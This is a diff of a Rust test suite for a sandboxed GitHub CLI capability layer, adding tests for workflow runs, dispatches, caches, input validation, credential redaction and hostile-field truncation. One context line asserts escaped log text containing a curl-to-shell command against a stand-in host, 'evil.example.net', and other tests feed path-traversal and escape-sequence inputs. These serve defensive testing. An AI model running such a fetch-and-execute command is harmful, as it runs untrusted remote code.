@@ -189,7 +189,12 @@ async fn invoke_with_stdin(
                             .expect("prefix")
                             .to_owned(),
                     ],
-                    allowed_methods: vec!["GET".into()],
+                    allowed_methods: vec![
+                        "GET".into(),
+                        "POST".into(),
+                        "PUT".into(),
+                        "DELETE".into(),
+                    ],
                     max_requests: 32,
                     max_request_bytes: 1024 * 1024,
                     max_response_bytes: 4 * 1024 * 1024,
@@ -776,7 +781,11 @@ async fn selected_job_count_probe_rejects_bad_denominators_and_unfinished_jobs_c
     assert_eq!(v["jobDurationCoverage"]["totalJobs"], 8);
 }
 fn recorded(number: u32) -> Value {
-    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/cassettes/actions/gh");
+    recorded_from("actions", number)
+}
+fn recorded_from(directory: &str, number: u32) -> Value {
+    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
+        .join(format!("tests/cassettes/{directory}/gh"));
     let prefix = format!("{number:04}-");
     let path = std::fs::read_dir(root)
         .unwrap()
@@ -834,30 +843,34 @@ async fn recorded_actions_replay_through_production_capabilities_and_exact_reque
 }
 #[test]
 fn recorded_actions_authorization_and_every_token_window_are_redacted() {
-    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/cassettes/actions/gh");
     let token = std::env::var("GH_CASSETTE_TOKEN").ok();
-    let mut count = 0;
-    for file in std::fs::read_dir(root).unwrap() {
-        let bytes = std::fs::read(file.unwrap().path()).unwrap();
-        let v: Value = serde_json::from_slice(&bytes).unwrap();
-        for section in ["request", "response"] {
-            for (name, value) in v[section]["headers"].as_object().unwrap() {
-                if name.eq_ignore_ascii_case("authorization") {
-                    assert_eq!(value, "[redacted]");
+    for (directory, expected) in [("actions", 19), ("actions-b4b", 4)] {
+        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
+            .join(format!("tests/cassettes/{directory}/gh"));
+        let mut count = 0;
+        for file in std::fs::read_dir(root).unwrap() {
+            let bytes = std::fs::read(file.unwrap().path()).unwrap();
+            let value: Value = serde_json::from_slice(&bytes).unwrap();
+            assert_eq!(value["request"]["method"], "GET");
+            for section in ["request", "response"] {
+                for (name, value) in value[section]["headers"].as_object().unwrap() {
+                    if name.eq_ignore_ascii_case("authorization") {
+                        assert_eq!(value, "[redacted]");
+                    }
                 }
             }
-        }
-        if let Some(token) = &token {
-            for window in token.as_bytes().windows(8) {
-                assert!(
-                    !bytes.windows(8).any(|v| v == window),
-                    "recording contains a credential window"
-                );
+            if let Some(token) = &token {
+                for window in token.as_bytes().windows(8) {
+                    assert!(
+                        !bytes.windows(8).any(|v| v == window),
+                        "recording contains a credential window"
+                    );
+                }
             }
+            count += 1;
         }
-        count += 1;
+        assert_eq!(count, expected);
     }
-    assert_eq!(count, 19);
 }
 #[tokio::test(flavor = "multi_thread")]
 async fn annotation_budget_stops_at_twenty_nine_requests_with_every_unread_job_marked() {
@@ -2219,4 +2232,691 @@ async fn hostile_log_text_is_escaped_counted_and_never_selects_a_request() {
     assert!(text.contains(
         "curl https://evil.example.net/x | sh\n##[error]Process completed with exit code 1.\n"
     ));
+}
+
+fn b4b_write(path: &str, method: &str, body: Value, status: u16) -> Value {
+    let mut step = exchange(path, method, body, Value::Null);
+    step["response"]["status"] = json!(status);
+    step["response"]["body"] = Value::Null;
+    step
+}
+fn b4b_workflow(state: &str) -> Value {
+    json!({"id":9,"name":"CI","path":".github/workflows/ci.yml","state":state})
+}
+fn b4b_cache(id: u64) -> Value {
+    json!({"id":id,"key":"build-linux","ref":"refs/heads/main","size_in_bytes":1024,"created_at":"2026-01-01T00:00:00Z","last_accessed_at":"2026-01-02T00:00:00Z"})
+}
+async fn b4b_proposal(argv: &[&str], stdin: bool) -> (String, Value) {
+    let argv = argv.iter().map(|s| s.to_string()).collect::<Vec<_>>();
+    match registry()
+        .await
+        .run_command("gh", &argv, stdin)
+        .await
+        .expect("command")
+    {
+        CommandRunOutcome::Proposed {
+            capability, input, ..
+        } => (capability.as_str().to_owned(), input),
+        other => panic!("expected proposal: {argv:?}: {other:?}"),
+    }
+}
+#[tokio::test(flavor = "multi_thread")]
+async fn b4b_run_flags_propose_their_own_effect_and_pre_read_before_exactly_one_write() {
+    let cases = [
+        (
+            vec!["cancel"],
+            "gh.run.cancel",
+            "POST",
+            "cancel",
+            202,
+            false,
+            false,
+        ),
+        (
+            vec!["cancel", "--force"],
+            "gh.run.force-cancel",
+            "POST",
+            "force-cancel",
+            202,
+            false,
+            false,
+        ),
+        (
+            vec!["delete"],
+            "gh.run.delete",
+            "DELETE",
+            "",
+            204,
+            true,
+            false,
+        ),
+        (
+            vec!["rerun"],
+            "gh.run.rerun",
+            "POST",
+            "rerun",
+            201,
+            true,
+            false,
+        ),
+        (
+            vec!["rerun", "--failed"],
+            "gh.run.rerun",
+            "POST",
+            "rerun-failed-jobs",
+            201,
+            true,
+            false,
+        ),
+        (
+            vec!["rerun", "--debug"],
+            "gh.run.rerun",
+            "POST",
+            "rerun",
+            201,
+            true,
+            true,
+        ),
+        (
+            vec!["rerun", "-d"],
+            "gh.run.rerun",
+            "POST",
+            "rerun",
+            201,
+            true,
+            true,
+        ),
+        (
+            vec!["rerun", "--job", "11"],
+            "gh.run.rerun",
+            "POST",
+            "job",
+            201,
+            true,
+            false,
+        ),
+        (
+            vec!["rerun", "-j", "11"],
+            "gh.run.rerun",
+            "POST",
+            "job",
+            201,
+            true,
+            false,
+        ),
+    ];
+    for (flags, id, method, suffix, status, completed, debug) in cases {
+        let mut argv = vec!["run", flags[0], "7", "-R", "octo/hello"];
+        argv.extend_from_slice(&flags[1..]);
+        let (capability, input) = b4b_proposal(&argv, false).await;
+        assert_eq!(capability, id);
+        assert_eq!(input["runId"], 7);
+        if debug {
+            assert_eq!(input["debug"], true);
+        }
+        if suffix == "rerun-failed-jobs" {
+            assert_eq!(input["failed"], true);
+        }
+        let mut run = run_body(2);
+        if !completed {
+            run["status"] = json!("in_progress");
+            run["conclusion"] = Value::Null;
+        }
+        let mut steps = vec![
+            get(ROOT, json!({"id":42})),
+            get(&format!("{ROOT}/actions/runs/7"), run),
+        ];
+        let target = if suffix == "job" {
+            assert_eq!(input["job"], 11);
+            steps.push(get(&format!("{ROOT}/actions/jobs/11"), job_body(2, false)));
+            format!("{ROOT}/actions/jobs/11/rerun")
+        } else {
+            format!(
+                "{ROOT}/actions/runs/7{}",
+                if suffix.is_empty() {
+                    String::new()
+                } else {
+                    format!("/{suffix}")
+                }
+            )
+        };
+        steps.push(b4b_write(
+            &target,
+            method,
+            if id == "gh.run.rerun" {
+                json!({"enable_debug_logging":debug})
+            } else {
+                Value::Null
+            },
+            status,
+        ));
+        let count = steps.len();
+        let (status, error, out) = invoke(id, input, steps).await;
+        assert_eq!(status, 0, "{argv:?}: {error}");
+        let out: Value = serde_json::from_slice(&out).unwrap();
+        assert_eq!(out["attempt"], 2);
+        assert_eq!(out["headSha"], "a".repeat(40));
+        assert_eq!(out["requestsUsed"], count);
+    }
+}
+#[tokio::test(flavor = "multi_thread")]
+async fn b4b_workflow_flags_use_fixed_endpoints_and_dispatch_never_reads_contents() {
+    for argv in [
+        vec![
+            "workflow",
+            "run",
+            "ci.yml",
+            "-R",
+            "octo/hello",
+            "--ref",
+            "main",
+            "--field",
+            "mode=fast",
+        ],
+        vec![
+            "workflow",
+            "run",
+            "9",
+            "-R",
+            "octo/hello",
+            "-r",
+            "main",
+            "-F",
+            "mode=fast",
+        ],
+        vec![
+            "workflow",
+            "run",
+            "9",
+            "-R",
+            "octo/hello",
+            "--raw-field",
+            "mode=fast",
+        ],
+        vec![
+            "workflow",
+            "run",
+            "9",
+            "-R",
+            "octo/hello",
+            "-f",
+            "mode=fast",
+        ],
+        vec!["workflow", "run", "9", "-R", "octo/hello", "--json"],
+    ] {
+        let stdin = argv.contains(&"--json");
+        let (id, input) = b4b_proposal(&argv, stdin).await;
+        assert_eq!(id, "gh.workflow.run");
+        if stdin {
+            assert_eq!(input["_stdinInputs"], true);
+        } else {
+            assert_eq!(input["inputs"], json!([{"name":"mode","value":"fast"}]));
+        }
+        let selector = if argv[2] == "ci.yml" { "ci.yml" } else { "9" };
+        let steps = vec![
+            get(ROOT, json!({"id":42,"default_branch":"main"})),
+            get(
+                &format!("{ROOT}/actions/workflows/{selector}"),
+                b4b_workflow("active"),
+            ),
+            b4b_write(
+                &format!("{ROOT}/actions/workflows/9/dispatches"),
+                "POST",
+                json!({"ref":"main","inputs":{"mode":"fast"}}),
+                204,
+            ),
+        ];
+        let (status, error, _) = invoke_with_stdin(
+            &id,
+            input,
+            steps,
+            stdin.then(|| br#"{"mode":"fast"}"#.to_vec()),
+        )
+        .await;
+        assert_eq!(status, 0, "{argv:?}: {error}");
+    }
+    for (verb, state) in [("enable", "disabled_manually"), ("disable", "active")] {
+        let (id, input) = b4b_proposal(&["workflow", verb, "9", "-R", "octo/hello"], false).await;
+        assert_eq!(id, format!("gh.workflow.{verb}"));
+        let (status, error, _) = invoke(
+            &id,
+            input,
+            vec![
+                get(ROOT, json!({"id":42})),
+                get(&format!("{ROOT}/actions/workflows/9"), b4b_workflow(state)),
+                b4b_write(
+                    &format!("{ROOT}/actions/workflows/9/{verb}"),
+                    "PUT",
+                    Value::Null,
+                    204,
+                ),
+            ],
+        )
+        .await;
+        assert_eq!(status, 0, "{error}");
+    }
+    for flags in [vec!["--yaml", "--ref", "main"], vec!["-y", "-r", "main"]] {
+        let mut argv = vec!["workflow", "view", "9", "-R", "octo/hello"];
+        argv.extend(flags);
+        let (id, input) = b4b_proposal(&argv, false).await;
+        assert_eq!(id, "gh.workflow.read");
+        assert_eq!(input["yaml"], true);
+        assert_eq!(input["ref"], "main");
+        let content = "name: CI\non: workflow_dispatch\n";
+        let (status,error,out)=invoke(&id,input,vec![get(ROOT,json!({"id":42})),get(&format!("{ROOT}/actions/workflows/9"),b4b_workflow("active")),get(&format!("{ROOT}/contents/.github/workflows/ci.yml?ref=main"),json!({"type":"file","path":".github/workflows/ci.yml","encoding":"base64","content":base64::engine::general_purpose::STANDARD.encode(content)}))]).await;
+        assert_eq!(status, 0, "{error}");
+        assert_eq!(String::from_utf8(out).unwrap(), format!("{content}\n"));
+    }
+}
+#[tokio::test(flavor = "multi_thread")]
+async fn b4b_workflow_and_cache_list_flags_preserve_typed_filters_and_exact_queries() {
+    for flags in [
+        vec!["--limit", "1", "--all", "--json", "id,name"],
+        vec!["-L", "1", "-a", "--json", "id,name"],
+    ] {
+        let mut argv = vec!["workflow", "list", "-R", "octo/hello"];
+        argv.extend(flags);
+        let (id, input) = b4b_proposal(&argv, false).await;
+        assert_eq!(id, "gh.workflow.list");
+        assert_eq!(input["limit"], 1);
+        assert_eq!(input["all"], true);
+        assert_eq!(input["_cliOutput"], "id,name");
+        let (status, error, out) = invoke(
+            &id,
+            input,
+            vec![
+                get(ROOT, json!({"id":42})),
+                get(
+                    &format!("{ROOT}/actions/workflows?page=1&per_page=100"),
+                    json!({"total_count":1,"workflows":[b4b_workflow("disabled_manually")]}),
+                ),
+            ],
+        )
+        .await;
+        assert_eq!(status, 0, "{error}");
+        let out: Value = serde_json::from_slice(&out).unwrap();
+        assert_eq!(out["workflows"], json!([{"id":9,"name":"CI"}]));
+    }
+    for flags in [
+        vec![
+            "--limit",
+            "1",
+            "--order",
+            "asc",
+            "--sort",
+            "size_in_bytes",
+            "--key",
+            "build",
+            "--ref",
+            "refs/heads/main",
+            "--json",
+            "id,key",
+        ],
+        vec![
+            "-L",
+            "1",
+            "-O",
+            "asc",
+            "-S",
+            "size_in_bytes",
+            "-k",
+            "build",
+            "-r",
+            "refs/heads/main",
+            "--json",
+            "id,key",
+        ],
+    ] {
+        let mut argv = vec!["cache", "list", "-R", "octo/hello"];
+        argv.extend(flags);
+        let (id, input) = b4b_proposal(&argv, false).await;
+        assert_eq!(id, "gh.cache.list");
+        assert_eq!(
+            input,
+            json!({"owner":"octo","repo":"hello","limit":1,"order":"asc","sort":"size_in_bytes","key":"build","ref":"refs/heads/main","_cliOutput":"id,key"})
+        );
+        let (status,error,out)=invoke(&id,input,vec![get(ROOT,json!({"id":42})),get(&format!("{ROOT}/actions/caches?key=build&ref=refs%2Fheads%2Fmain&sort=size_in_bytes&direction=asc&page=1&per_page=100"),json!({"total_count":1,"actions_caches":[b4b_cache(5)]}))]).await;
+        assert_eq!(status, 0, "{error}");
+        let out: Value = serde_json::from_slice(&out).unwrap();
+        assert_eq!(out["caches"], json!([{"id":5,"key":"build-linux"}]));
+    }
+}
+#[tokio::test(flavor = "multi_thread")]
+async fn b4b_cache_deletes_pre_read_ids_and_bound_all_before_the_first_write() {
+    for flags in [
+        vec!["5"],
+        vec!["--all"],
+        vec!["-a"],
+        vec!["build-linux", "--ref", "refs/heads/main"],
+        vec!["build-linux", "-r", "refs/heads/main"],
+    ] {
+        let mut argv = vec!["cache", "delete", "-R", "octo/hello"];
+        argv.extend(flags.clone());
+        let (id, input) = b4b_proposal(&argv, false).await;
+        assert_eq!(id, "gh.cache.delete");
+        let key = flags[0] == "build-linux";
+        let query = if key {
+            "key=build-linux&ref=refs%2Fheads%2Fmain&"
+        } else {
+            ""
+        };
+        let mut write = if key {
+            exchange(
+                &format!("{ROOT}/actions/caches?key=build-linux&ref=refs%2Fheads%2Fmain"),
+                "DELETE",
+                Value::Null,
+                json!({"total_count":1,"actions_caches":[b4b_cache(5)]}),
+            )
+        } else {
+            b4b_write(
+                &format!("{ROOT}/actions/caches/5"),
+                "DELETE",
+                Value::Null,
+                204,
+            )
+        };
+        write["response"]["status"] = json!(if key { 200 } else { 204 });
+        let (status, error, _) = invoke(
+            &id,
+            input,
+            vec![
+                get(ROOT, json!({"id":42})),
+                get(
+                    &format!("{ROOT}/actions/caches?{query}page=1&per_page=100"),
+                    json!({"total_count":1,"actions_caches":[b4b_cache(5)]}),
+                ),
+                write,
+            ],
+        )
+        .await;
+        assert_eq!(status, 0, "{error}");
+    }
+    for flags in [
+        vec!["--all", "--succeed-on-no-caches"],
+        vec!["-a", "--succeed-on-no-caches"],
+    ] {
+        let mut argv = vec!["cache", "delete", "-R", "octo/hello"];
+        argv.extend(flags);
+        let (id, input) = b4b_proposal(&argv, false).await;
+        assert_eq!(input["succeedOnNoCaches"], true);
+        let (status, error, out) = invoke(
+            &id,
+            input,
+            vec![
+                get(ROOT, json!({"id":42})),
+                get(
+                    &format!("{ROOT}/actions/caches?page=1&per_page=100"),
+                    json!({"total_count":0,"actions_caches":[]}),
+                ),
+            ],
+        )
+        .await;
+        assert_eq!(status, 0, "{error}");
+        let out: Value = serde_json::from_slice(&out).unwrap();
+        assert_eq!(out["deletedIds"], json!([]));
+    }
+    let rows = (1..=21).map(b4b_cache).collect::<Vec<_>>();
+    let (status, _, out) = invoke(
+        "gh.cache.delete",
+        json!({"owner":"octo","repo":"hello","all":true}),
+        vec![
+            get(ROOT, json!({"id":42})),
+            get(
+                &format!("{ROOT}/actions/caches?page=1&per_page=100"),
+                json!({"total_count":21,"actions_caches":rows}),
+            ),
+        ],
+    )
+    .await;
+    assert_eq!(status, 3);
+    assert!(out.is_empty());
+}
+#[tokio::test(flavor = "multi_thread")]
+async fn b4b_invalid_inputs_and_refused_workflow_web_never_send_http() {
+    for (id, extra) in [
+        ("gh.run.cancel", json!({"runId":0})),
+        ("gh.run.rerun", json!({"runId":7,"failed":true,"job":11})),
+        ("gh.workflow.run", json!({"workflow":"../ci.yml"})),
+        (
+            "gh.workflow.run",
+            json!({"workflow":9,"inputs":{"bad\nkey":"x"}}),
+        ),
+        ("gh.workflow.read", json!({"workflow":9,"ref":"bad?ref"})),
+        ("gh.cache.delete", json!({"cacheId":0})),
+        ("gh.cache.delete", json!({"all":true,"key":"x"})),
+        ("gh.cache.list", json!({"key":"bad\nkey"})),
+        ("gh.cache.list", json!({"limit":101})),
+        ("gh.workflow.list", json!({"limit":0})),
+    ] {
+        let mut input = json!({"owner":"octo","repo":"hello"});
+        input
+            .as_object_mut()
+            .unwrap()
+            .extend(extra.as_object().unwrap().clone());
+        let (status, _, out) = invoke(id, input, vec![]).await;
+        assert_eq!(status, 2, "{id}");
+        assert!(out.is_empty());
+    }
+    let args = ["workflow", "view", "9", "-R", "octo/hello", "--web"].map(str::to_owned);
+    let outcome = registry()
+        .await
+        .run_command("gh", &args, false)
+        .await
+        .unwrap();
+    assert!(matches!(
+        outcome,
+        CommandRunOutcome::Rendered { status: 2, .. } | CommandRunOutcome::Failed { .. }
+    ));
+    let (status, _, _) = invoke_with_stdin(
+        "gh.workflow.run",
+        json!({"owner":"octo","repo":"hello","workflow":9,"_stdinInputs":true}),
+        vec![],
+        Some(b"[]".to_vec()),
+    )
+    .await;
+    assert_eq!(status, 2);
+}
+#[tokio::test(flavor = "multi_thread")]
+async fn b4b_state_conflicts_and_head_mismatches_stop_before_any_mutation() {
+    for id in ["gh.run.cancel", "gh.run.force-cancel"] {
+        let (status, _, out) = invoke(
+            id,
+            json!({"owner":"octo","repo":"hello","runId":7}),
+            start(),
+        )
+        .await;
+        assert_eq!(status, 3);
+        assert!(out.is_empty());
+    }
+    let (status, _, out) = invoke(
+        "gh.run.delete",
+        json!({"owner":"octo","repo":"hello","runId":7,"expectedHeadSha":"b".repeat(40)}),
+        start(),
+    )
+    .await;
+    assert_ne!(status, 0);
+    assert!(out.is_empty());
+    for (id, state) in [
+        ("gh.workflow.enable", "active"),
+        ("gh.workflow.disable", "disabled_manually"),
+        ("gh.workflow.run", "disabled_manually"),
+    ] {
+        let (status, _, out) = invoke(
+            id,
+            json!({"owner":"octo","repo":"hello","workflow":9}),
+            vec![
+                get(ROOT, json!({"id":42})),
+                get(&format!("{ROOT}/actions/workflows/9"), b4b_workflow(state)),
+            ],
+        )
+        .await;
+        assert_eq!(status, 3);
+        assert!(out.is_empty());
+    }
+}
+#[test]
+fn b4b_component_http_script_preserves_permission_rate_limit_and_redirect_refusals() {
+    for (status, expected) in [
+        (
+            403,
+            "repository is invisible or Actions permission is insufficient\n",
+        ),
+        (
+            404,
+            "repository is invisible or Actions permission is insufficient\n",
+        ),
+        (429, "Actions rate limit is exhausted\n"),
+        (302, "GitHub returned an unexpected HTTP status\n"),
+    ] {
+        let h = Harness::<Gh>::get(component()).http(api(status, &[], vec![]));
+        let output = h
+            .call(
+                "gh.workflow.run",
+                json!({"owner":"octo","repo":"hello","workflow":9}),
+            )
+            .unwrap();
+        assert_eq!(output.status, 3);
+        if status != 302 {
+            assert_eq!(output.stderr, expected);
+        }
+        assert_eq!(output.http_calls.len(), 1);
+        let req = output.http_request.unwrap();
+        assert_eq!(req.uri, format!("https://api.github.com{ROOT}"));
+        assert_eq!(req.method, "GET");
+        assert!(
+            !req.headers
+                .iter()
+                .any(|h| h.name.eq_ignore_ascii_case("authorization"))
+        );
+    }
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn b4b_recorded_empty_scratch_reads_replay_without_claiming_a_workflow_exists() {
+    let input = json!({"owner":"dekopon-agents","repo":"gh-parity-scratch"});
+    for (id, record, field) in [
+        ("gh.workflow.list", 2, "workflows"),
+        ("gh.cache.list", 3, "caches"),
+    ] {
+        let (status, error, out) = invoke(
+            id,
+            input.clone(),
+            vec![
+                recorded_from("actions-b4b", 1),
+                recorded_from("actions-b4b", record),
+            ],
+        )
+        .await;
+        assert_eq!(status, 0, "{error}");
+        let out: Value = serde_json::from_slice(&out).unwrap();
+        assert_eq!(out[field], json!([]));
+        assert_eq!(out["coverage"]["incomplete"], false);
+    }
+    let (status, error, out) = invoke(
+        "gh.workflow.read",
+        json!({"owner":"dekopon-agents","repo":"gh-parity-scratch","workflow":"ci.yml"}),
+        vec![
+            recorded_from("actions-b4b", 1),
+            recorded_from("actions-b4b", 4),
+        ],
+    )
+    .await;
+    assert_eq!(status, 3);
+    assert_eq!(error, "Actions target was not found\n");
+    assert!(out.is_empty());
+}
+#[tokio::test(flavor = "multi_thread")]
+async fn b4b_dispatch_failures_are_distinct_and_never_retry_the_write_or_echo_github_text() {
+    for (status, expected) in [
+        (
+            403,
+            "repository is invisible or Actions permission is insufficient\n",
+        ),
+        (404, "Actions target was not found\n"),
+        (
+            409,
+            "operation does not apply to the observed target state\n",
+        ),
+        (422, "GitHub rejected the workflow inputs\n"),
+        (429, "Actions rate limit is exhausted\n"),
+    ] {
+        let mut write = exchange(
+            &format!("{ROOT}/actions/workflows/9/dispatches"),
+            "POST",
+            json!({"ref":"main","inputs":{}}),
+            json!({"message":"untrusted\u{1b}".repeat(10000)}),
+        );
+        write["response"]["status"] = json!(status);
+        let (exit, error, out) = invoke(
+            "gh.workflow.run",
+            json!({"owner":"octo","repo":"hello","workflow":9}),
+            vec![
+                get(ROOT, json!({"id":42,"default_branch":"main"})),
+                get(
+                    &format!("{ROOT}/actions/workflows/9"),
+                    b4b_workflow("active"),
+                ),
+                write,
+            ],
+        )
+        .await;
+        assert_eq!(exit, 3);
+        assert_eq!(error, expected);
+        assert!(out.is_empty());
+    }
+    let mut missing = get(&format!("{ROOT}/actions/workflows/9"), Value::Null);
+    missing["response"]["status"] = json!(404);
+    let (status, error, out) = invoke(
+        "gh.workflow.run",
+        json!({"owner":"octo","repo":"hello","workflow":9}),
+        vec![get(ROOT, json!({"id":42})), missing],
+    )
+    .await;
+    assert_eq!(status, 3);
+    assert_eq!(error, "Actions target was not found\n");
+    assert!(out.is_empty());
+}
+#[tokio::test(flavor = "multi_thread")]
+async fn b4b_hostile_workflow_and_cache_fields_are_bounded_and_inconsistent_pages_are_incomplete() {
+    let mut workflow = b4b_workflow("active");
+    workflow["name"] = json!("\u{1b}x".repeat(1000));
+    let (status, error, out) = invoke(
+        "gh.workflow.list",
+        json!({"owner":"octo","repo":"hello"}),
+        vec![
+            get(ROOT, json!({"id":42})),
+            get(
+                &format!("{ROOT}/actions/workflows?page=1&per_page=100"),
+                json!({"total_count":1,"workflows":[workflow]}),
+            ),
+        ],
+    )
+    .await;
+    assert_eq!(status, 0, "{error}");
+    let out: Value = serde_json::from_slice(&out).unwrap();
+    let name = out["workflows"][0]["name"].as_str().unwrap();
+    assert!(!name.contains('\u{1b}'));
+    assert!(name.len() < 340);
+    assert!(name.ends_with("[dekopon: truncated to 256 bytes of 1000]"));
+    let mut cache = b4b_cache(5);
+    cache["key"] = json!("x".repeat(1000));
+    let (status, _, out) = invoke(
+        "gh.cache.list",
+        json!({"owner":"octo","repo":"hello"}),
+        vec![
+            get(ROOT, json!({"id":42})),
+            get(
+                &format!(
+                    "{ROOT}/actions/caches?sort=last_accessed_at&direction=desc&page=1&per_page=100"
+                ),
+                json!({"total_count":2,"actions_caches":[cache]}),
+            ),
+        ],
+    )
+    .await;
+    assert_eq!(status, 3);
+    let out: Value = serde_json::from_slice(&out).unwrap();
+    assert_eq!(out["coverage"]["incomplete"], true);
+    assert_eq!(out["coverage"]["reasons"], json!(["count-mismatch"]));
+    assert!(out["caches"][0]["key"].as_str().unwrap().len() < 600);
 }
